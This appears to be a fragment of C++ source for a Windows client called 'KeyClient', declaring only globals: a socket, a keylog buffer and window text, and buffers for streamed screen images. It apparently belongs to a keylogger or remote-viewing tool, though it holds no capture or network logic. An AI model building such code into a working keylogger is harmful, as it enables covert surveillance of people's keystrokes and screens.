#include "project_client.h"

map<string, CLIENT_MESSAGES> MESSAGEMAP;

struct sockaddr_in clientsocket;
SOCKET sa;
stringstream KEYLOG_STREAM;
char client_buffer[BUFFER_SZ];
string client_operator, client_operand;
string keylog = "Keylog window:\n";

RECT click_rectangle{
    15,
    30,
    655,
    390
};

/*  Make the class name into a global variable  */
char szClassName[ ] = "KeyClient";
HWND g_hToolbar = NULL;

        int bitcounter = 0, framesdrawn = 0;
        bool pkt_complete = false;
        bool pict_is_streaming = false;
        bool right_click = false;


        unsigned char *bitmapbuf, *bitmapbuf_compressed;

        IMAGE_PKT_HEADER hdrpkt;
        BITMAPINFOHEADER bi;
        HDC handle_WindowDC;
        PAINTSTRUCT paintstruct;

